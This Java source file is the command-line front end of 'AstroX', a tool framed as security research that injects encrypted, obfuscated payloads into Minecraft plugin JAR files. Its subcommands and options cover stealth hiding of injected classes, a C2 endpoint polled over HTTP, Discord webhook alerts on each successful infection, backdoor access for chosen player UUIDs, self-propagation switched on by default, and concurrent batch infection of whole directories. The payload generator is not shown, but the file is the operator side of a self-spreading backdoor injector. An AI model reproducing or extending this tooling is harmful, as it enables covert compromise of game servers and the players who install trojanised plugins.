package dev.naruto.astrox;

import dev.naruto.astrox.core.*;
import dev.naruto.astrox.utils.AuditLogger;
import dev.naruto.astrox.utils.WebhookNotifier;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import picocli.CommandLine.Parameters;

import java.io.*;
import java.util.List;
import java.util.Optional;
import java.util.Properties;
import java.util.concurrent.Callable;

/**
 * AstroX CLI — Professional Security Research Framework.
 * Picocli-based command-line interface with subcommands.
 */
@Command(
        name = "astrox",
        description = "Advanced Minecraft Plugin Security Research Framework",
        mixinStandardHelpOptions = true,
        versionProvider = AstroX.VersionProvider.class,
        subcommands = {
                AstroX.InjectCommand.class,
                AstroX.BatchCommand.class,
                AstroX.AnalyzeCommand.class,
                AstroX.VerifyAuditCommand.class,
                AstroX.FingerprintCommand.class,
                CommandLine.HelpCommand.class
        }
)
public class AstroX implements Callable<Integer> {

    private static final Logger LOG = LoggerFactory.getLogger(AstroX.class);

    private static final String BANNER = """

      ========================================================================

         _     ____ _____ ____   _____  __  __   _____ ___   ___  _    \s
        / \\   / ___|_   _|  _ \\ / _ \\ \\/ /  |_   _/ _ \\ / _ \\| |   \s
       / _ \\  \\___ \\ | | | |_) | | | |  /     | || | | | | | | |   \s
      / ___ \\  ___) || | |  _ <| |_| | /\\     | || |_| | |_| | |___\s
     /_/   \\_\\|____/ |_| |_| \\_\\\\___/_/\\_\\    |_| \\___/ \\___/|_____|

                Advanced Security Research Framework v2.0
              Self-Replicating | Polymorphic | AES-256 Encrypted

      ========================================================================
    """;

    public static void main(String[] args) {
        System.out.println(BANNER);

        int exitCode = new CommandLine(new AstroX())
                .setCaseInsensitiveEnumValuesAllowed(true)
                .execute(args);
        System.exit(exitCode);
    }

    @Override
    public Integer call() {
        // No subcommand specified — print usage
        new CommandLine(this).usage(System.out);
        return 0;
    }

    // ==================== INJECT Subcommand ====================

    @Command(name = "inject", description = "Inject payload into a single plugin JAR",
            mixinStandardHelpOptions = true)
    static class InjectCommand implements Callable<Integer> {

        @Parameters(index = "0", description = "Target plugin JAR file")
        File inputFile;

        @Option(names = {"--key", "-k"}, required = true,
                description = "Master authentication key (required)")
        String masterKey;

        @Option(names = "--stealth", description = "Enable stealth mode (hide from JAR listing)")
        boolean stealth;

        @Option(names = "--dry-run", description = "Simulate injection without writing output")
        boolean dryRun;

        @Option(names = {"--webhook", "-w"}, description = "Discord webhook URL")
        String webhookUrl;

        @Option(names = {"--c2"}, description = "C2 endpoint URL for HTTP long-polling")
        String c2Url;

        @Option(names = {"--prefix", "-p"}, defaultValue = "#",
                description = "Command prefix (default: #)")
        String prefix;

        @Option(names = "--auth", arity = "1..*", description = "Pre-authorized player UUIDs")
        List<String> authorizedUUIDs;

        @Option(names = "--no-propagation", description = "Disable auto-spreading")
        boolean noPropagation;

        @Option(names = "--report", description = "Write JSON report to file")
        File reportFile;

        @Option(names = "--debug", description = "Enable verbose debug logging")
        boolean debug;

        @Override
        public Integer call() {
            try {
                // Set master key
                Config.setMasterKey(masterKey);

                // Apply runtime config
                applyConfig();

                // Validate input
                validateInput(inputFile);

                // Check plugin fingerprint
                checkFingerprint(inputFile);

                File outputJar = new File(inputFile.getParentFile(),
                        inputFile.getName().replace(".jar", "-astrox.jar"));

                // Analyze
                LOG.info("═══════════════════════════════════════════════");
                LOG.info(" ANALYSIS PHASE");
                LOG.info("═══════════════════════════════════════════════");

                JarAnalyzer analyzer = new JarAnalyzer(inputFile);
                analyzer.analyze();

                LOG.info("Target Plugin    : {} v{}", analyzer.getPluginName(), analyzer.getVersion());
                LOG.info("Main Class       : {}", analyzer.getMainClass());
                LOG.info("Java Version     : {}", analyzer.getJavaVersion());
                LOG.info("Base Package     : {}", analyzer.getBasePackage());

                // Inject
                LOG.info("");
                LOG.info("═══════════════════════════════════════════════");
                LOG.info(" INJECTION PHASE");
                LOG.info("═══════════════════════════════════════════════");

                Config.regenerateEncryptionKey();
                LOG.info("Generated AES-256-GCM key: {}...",
                        Config.getEncryptionKeyHex().substring(0, 16));

                PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
                byte[] payload = weaver.generatePayload();
                LOG.info("Payload ready ({} bytes)", payload.length);

                Injector injector = new Injector(inputFile, outputJar, dryRun, stealth);
                PipelineResult result = injector.inject(analyzer, payload);

                // Audit log
                if (!dryRun) {
                    AuditLogger audit = new AuditLogger(masterKey);
                    audit.logInjection(inputFile, outputJar,
                            result.injectedClasses(), "cli-operator");
                }

                // Print result
                printResult(result, outputJar);

                // Write report
                if (reportFile != null) {
                    result.writeReport(reportFile);
                    LOG.info("Report written to: {}", reportFile.getAbsolutePath());
                }

                // Webhook notification
                if (webhookUrl != null && !dryRun) {
                    sendWebhook(analyzer, outputJar);
                }

            } catch (Exception e) {
                LOG.error("INJECTION FAILED: {}", e.getMessage());
                if (debug) {
                    LOG.error("Stack trace:", e);
                }
                return 1;
            }
            return 0;
        }

        private void applyConfig() {
            RuntimeConfig.commandPrefix = prefix;
            RuntimeConfig.debugMode = debug;
            RuntimeConfig.stealthMode = stealth;
            RuntimeConfig.dryRun = dryRun;
            RuntimeConfig.enablePropagation = !noPropagation;
            if (webhookUrl != null) RuntimeConfig.webhookUrl = webhookUrl;
            if (c2Url != null) RuntimeConfig.c2Url = c2Url;
            if (authorizedUUIDs != null) RuntimeConfig.preAuthorizedUUIDs = authorizedUUIDs;
        }

        private void printResult(PipelineResult result, File outputJar) {
            LOG.info("");
            LOG.info("═══════════════════════════════════════════════");
            if (result.dryRun()) {
                LOG.info("         [DRY-RUN] SIMULATION COMPLETE");
            } else {
                LOG.info("         [+] INJECTION SUCCESSFUL!");
            }
            LOG.info("═══════════════════════════════════════════════");
            LOG.info("");

            if (!result.dryRun()) {
                LOG.info("Output File      : {}", outputJar.getName());
                LOG.info("File Size        : {}", formatFileSize(outputJar.length()));
            }
            LOG.info("Injected Classes : {}", result.injectedClasses().size());
            LOG.info("Duration         : {}ms", result.durationMs());
            LOG.info("Stealth Mode     : {}", result.stealthMode() ? "ENABLED" : "DISABLED");
            LOG.info("Encryption       : AES-256-GCM");

            if (!result.warnings().isEmpty()) {
                LOG.warn("Warnings:");
                for (String w : result.warnings()) {
                    LOG.warn("  ⚠ {}", w);
                }
            }
        }

        private void sendWebhook(JarAnalyzer analyzer, File outputJar) {
            try {
                WebhookNotifier notifier = new WebhookNotifier(webhookUrl);
                notifier.sendInjectionSuccess(
                        analyzer.getPluginName(), analyzer.getVersion(),
                        analyzer.getMainClass(), outputJar.length(), prefix);
                LOG.info("Webhook sent successfully");
            } catch (Exception e) {
                LOG.warn("Webhook failed: {}", e.getMessage());
            }
        }
    }

    // ==================== BATCH Subcommand ====================

    @Command(name = "batch", description = "Inject into all JARs in a directory concurrently",
            mixinStandardHelpOptions = true)
    static class BatchCommand implements Callable<Integer> {

        @Option(names = {"--target-dir", "-d"}, required = true,
                description = "Directory containing target JARs")
        File targetDir;

        @Option(names = {"--key", "-k"}, required = true,
                description = "Master authentication key")
        String masterKey;

        @Option(names = {"--threads", "-t"}, defaultValue = "4",
                description = "Number of concurrent threads (default: 4)")
        int threads;

        @Option(names = "--stealth", description = "Enable stealth mode")
        boolean stealth;

        @Option(names = "--dry-run", description = "Simulate without writing output")
        boolean dryRun;

        @Option(names = "--report", description = "Write batch report to JSON file")
        File reportFile;

        @Override
        public Integer call() {
            try {
                Config.setMasterKey(masterKey);
                RuntimeConfig.stealthMode = stealth;
                RuntimeConfig.dryRun = dryRun;

                if (!targetDir.isDirectory()) {
                    LOG.error("Not a directory: {}", targetDir);
                    return 1;
                }

                BatchProcessor processor = new BatchProcessor(
                        targetDir, threads, dryRun, stealth);
                List<PipelineResult> results = processor.processAll();

                if (reportFile != null) {
                    com.fasterxml.jackson.databind.ObjectMapper mapper =
                            new com.fasterxml.jackson.databind.ObjectMapper()
                                    .enable(com.fasterxml.jackson.databind.SerializationFeature.INDENT_OUTPUT);
                    mapper.writeValue(reportFile, results);
                    LOG.info("Batch report written to: {}", reportFile.getAbsolutePath());
                }

            } catch (Exception e) {
                LOG.error("Batch processing failed: {}", e.getMessage(), e);
                return 1;
            }
            return 0;
        }
    }

    // ==================== ANALYZE Subcommand ====================

    @Command(name = "analyze", description = "Analyze a plugin JAR without injecting",
            mixinStandardHelpOptions = true)
    static class AnalyzeCommand implements Callable<Integer> {

        @Parameters(index = "0", description = "Target plugin JAR file")
        File inputFile;

        @Override
        public Integer call() {
            try {
                validateInput(inputFile);

                JarAnalyzer analyzer = new JarAnalyzer(inputFile);
                analyzer.analyze();

                LOG.info("═══════════════════════════════════════════════");
                LOG.info(" PLUGIN ANALYSIS RESULTS");
                LOG.info("═══════════════════════════════════════════════");
                LOG.info("Plugin Name  : {}", analyzer.getPluginName());
                LOG.info("Version      : {}", analyzer.getVersion());
                LOG.info("Main Class   : {}", analyzer.getMainClass());
                LOG.info("Java Version : {}", analyzer.getJavaVersion());
                LOG.info("Base Package : {}", analyzer.getBasePackage());
                LOG.info("File Size    : {}", formatFileSize(inputFile.length()));

                // Check fingerprint
                checkFingerprint(inputFile);

            } catch (Exception e) {
                LOG.error("Analysis failed: {}", e.getMessage());
                return 1;
            }
            return 0;
        }
    }

    // ==================== VERIFY-AUDIT Subcommand ====================

    @Command(name = "verify-audit", description = "Verify integrity of the injection audit log",
            mixinStandardHelpOptions = true)
    static class VerifyAuditCommand implements Callable<Integer> {

        @Option(names = {"--key", "-k"}, required = true,
                description = "Master key used during injections")
        String masterKey;

        @Override
        public Integer call() {
            AuditLogger audit = new AuditLogger(masterKey);
            AuditLogger.VerificationResult result = audit.verifyAll();

            LOG.info("═══════════════════════════════════════════════");
            LOG.info(" AUDIT LOG VERIFICATION");
            LOG.info("═══════════════════════════════════════════════");
            LOG.info("Total entries : {}", result.totalEntries());
            LOG.info("Valid entries : {}", result.validEntries());

            if (result.isClean()) {
                LOG.info("Status        : ✓ CLEAN — no tampering detected");
            } else {
                LOG.error("Status        : ✗ TAMPERED — {} errors found", result.errors().size());
                for (String error : result.errors()) {
                    LOG.error("  ✗ {}", error);
                }
                return 1;
            }
            return 0;
        }
    }

    // ==================== FINGERPRINT Subcommand ====================

    @Command(name = "fingerprint", description = "Manage the plugin fingerprint database",
            mixinStandardHelpOptions = true)
    static class FingerprintCommand implements Callable<Integer> {

        @Option(names = "--add", description = "Add a JAR to the fingerprint database")
        File addFile;

        @Option(names = "--name", description = "Plugin name (used with --add)")
        String pluginName;

        @Option(names = "--version", description = "Plugin version (used with --add)")
        String pluginVersion;

        @Option(names = "--list", description = "List all known fingerprints")
        boolean list;

        @Option(names = "--check", description = "Check if a JAR matches a known fingerprint")
        File checkFile;

        @Override
        public Integer call() {
            PluginFingerprinter fp = new PluginFingerprinter();

            if (list) {
                LOG.info("Known plugin fingerprints:");
                fp.getDatabase().forEach((key, value) ->
                        LOG.info("  {} v{} — {} fingerprints ({})",
                                value.name(), value.version(),
                                value.fingerprints().size(), value.source()));
                return 0;
            }

            if (addFile != null) {
                try {
                    String name = pluginName != null ? pluginName : addFile.getName().replace(".jar", "");
                    String ver = pluginVersion != null ? pluginVersion : "unknown";
                    fp.addFingerprint(name, ver, addFile);
                } catch (Exception e) {
                    LOG.error("Failed to add fingerprint: {}", e.getMessage());
                }
                return 0;
            }

            if (checkFile != null) {
                Optional<PluginFingerprinter.PluginFingerprint> match = fp.checkKnownSafe(checkFile);
                if (match.isPresent()) {
                    LOG.warn("⚠ MATCH: {} matches known plugin: {} v{}",
                            checkFile.getName(), match.get().name(), match.get().version());
                } else {
                    LOG.info("✓ No known fingerprint match for {}", checkFile.getName());
                }
                return 0;
            }

            new CommandLine(this).usage(System.out);
            return 0;
        }
    }

    // ==================== Shared utilities ====================

    static void validateInput(File inputFile) {
        if (!inputFile.exists()) {
            throw new RuntimeException("File not found: " + inputFile.getAbsolutePath());
        }
        if (!inputFile.getName().endsWith(".jar")) {
            throw new RuntimeException("Not a JAR file: " + inputFile.getName());
        }
        long maxSize = 50L * 1024 * 1024; // 50MB
        if (inputFile.length() > maxSize) {
            throw new RuntimeException(String.format(
                    "JAR too large: %s (max 50MB)", formatFileSize(inputFile.length())));
        }
    }

    static void checkFingerprint(File inputFile) {
        PluginFingerprinter fp = new PluginFingerprinter();
        Optional<PluginFingerprinter.PluginFingerprint> match = fp.checkKnownSafe(inputFile);
        if (match.isPresent()) {
            LOG.warn("⚠ WARNING: Target matches known-safe plugin: {} v{}",
                    match.get().name(), match.get().version());
            LOG.warn("  Injecting into critical plugins may cause server instability!");
        }
    }

    static String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp - 1) + "";
        return String.format("%.2f %sB", bytes / Math.pow(1024, exp), pre);
    }

    // ==================== Version Provider ====================

    static class VersionProvider implements CommandLine.IVersionProvider {
        @Override
        public String[] getVersion() {
            try {
                Properties props = new Properties();
                try (InputStream is = getClass().getResourceAsStream("/astrox.properties")) {
                    if (is != null) props.load(is);
                }
                return new String[]{
                        "AstroX v" + props.getProperty("astrox.version", "2.0.0")
                };
            } catch (IOException e) {
                return new String[]{"AstroX v2.0.0"};
            }
        }
    }
}
